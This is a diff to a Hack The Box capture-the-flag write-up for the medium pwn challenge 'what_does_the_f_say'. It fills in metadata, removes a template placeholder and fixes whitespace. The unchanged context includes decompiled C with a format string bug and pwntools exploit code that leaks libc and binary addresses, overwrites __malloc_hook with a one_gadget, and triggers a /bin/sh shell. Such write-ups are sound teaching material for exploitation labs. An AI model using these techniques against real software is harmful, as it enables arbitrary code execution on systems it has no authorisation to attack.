@@ -1,11 +1,11 @@
 ![img](https://i.imgur.com/Xw2DVAT.png)
 
-<img src='https://i.imgur.com/heKOInX.png' style='zoom: 80%;' align=left /> <font size='10'><Challenge_Name></font>
+<img src='https://i.imgur.com/heKOInX.png' style='zoom: 80%;' align=left /> <font size='10'>what_does_the_f_say</font>
 
 2<sup>nd</sup> February 2025
 
-Prepared By: `Emc235`
-Author: `w3th4nds`
+Prepared By: [Emc235](https://app.hackthebox.com/users/2814286)  
+Author: [w3th4nds](https://app.hackthebox.com/users/70668)
 
 Difficulty: <font color='orange'>Medium</font>
 
@@ -34,7 +34,7 @@ void drinks_menu(void) {
   int local_3c;
   char local_38 [40];
   long local_10;
-  
+
   local_10 = *(long *)(in_FS_OFFSET + 0x28);
   memset(local_38,0,0x1e);
   puts("\n1. Milky way (4.90 s.rocks)\n2. Kryptonite vodka (6.90 s.rocks)\n3. Deathstar(70.00 s.rocks )");
@@ -76,11 +76,6 @@ void drinks_menu(void) {
 We notice a critical format string bug. It is a small buffer of only 29 bytes but it can still be exploited.
 
 # Solution
-
-## Finding the vulnerability
-
-Explain where the vulnerability is. Be as detailed as possible so there are no logical gaps as to how you figured out the vulnerability and how you will proceed to the solution.
-
 ## Exploitation
 
 As with every program we start by defining simple function to communicate with the program
@@ -97,7 +92,7 @@ def space_drinks(drink, payload: bytes=b""):
     menu(1)
     p.recvuntil(b"Deathstar(70.00 s.rocks)\n")
     p.sendline(str(drink).encode("utf-8"))
-    
+
     if drink == 2:
         p.recvuntil(b"\nRed or Green Kryptonite?\n")
         p.send(payload)
@@ -113,9 +108,9 @@ space_drinks(2, b"%9$s".ljust(8, b"\x00") + p64(binary.got.exit))
 leak = u64(p.recvn(6).ljust(8, b"\x00"))
 log.info(f"exit   @ {hex(leak)}")
 ```
-After leaking these values we can head over https://libc.rip/ to input our leaks and find our exact libc ([ibc6_2.27-3ubuntu1.2_amd64](https://libc.rip/download/libc6_2.27-3ubuntu1.2_amd64.so)). This version of libc is very special as it is still an "old" libc and still uses malloc hooks (`__malloc_hook`, `__free_hook`).  
+After leaking these values we can head over https://libc.rip/ to input our leaks and find our exact libc ([ibc6_2.27-3ubuntu1.2_amd64](https://libc.rip/download/libc6_2.27-3ubuntu1.2_amd64.so)). This version of libc is very special as it is still an "old" libc and still uses malloc hooks (`__malloc_hook`, `__free_hook`).
 
-Now that we have the exact libc that they are using and leveraging the got leaks we completely bypassed ASLR and we can start writing to arbitrary addresses. In our case of course we can't start writing to the GOT since FULL RelRO is applied to this binary. As I mentioned the the `__malloc_hook` is present in this binary so we will be overwriting that.  
+Now that we have the exact libc that they are using and leveraging the got leaks we completely bypassed ASLR and we can start writing to arbitrary addresses. In our case of course we can't start writing to the GOT since FULL RelRO is applied to this binary. As I mentioned the the `__malloc_hook` is present in this binary so we will be overwriting that.
 
 Firstly we will try to make the program jump to a fake address, inspect the registers and find the best `one_gadget` to jump.
 ```py
@@ -126,7 +121,7 @@ for i in range(6):
     }, write_size="byte")
     space_drinks(2, payload)
 ```
-And for the trigger we will call `space_drinks(2, b"%200000x")`. This would make our program jump to our fake address because `printf` uses internally `malloc` to handle large inputs.  
+And for the trigger we will call `space_drinks(2, b"%200000x")`. This would make our program jump to our fake address because `printf` uses internally `malloc` to handle large inputs.
 At the crash site we inspect the registers and find this gadget
 ```py
 0x4f3c2 execve("/bin/sh", rsp+0x40, environ)
@@ -158,12 +153,12 @@ def space_drinks(drink, payload: bytes=b""):
     menu(1)
     p.recvuntil(b"Deathstar(70.00 s.rocks)\n")
     p.sendline(str(drink).encode("utf-8"))
-    
+
     if drink == 2:
         p.recvuntil(b"\nRed or Green Kryptonite?\n")
         p.send(payload)
-        
-    
+
+
 space_drinks(2, b"%15$p")  # fox_bar + 106
 binary.address = int(p.recvline().decode("utf-8").strip(), base=16) - binary.symbols.fox_bar - 106
 log.info(f"binary @ {hex(binary.address)}")
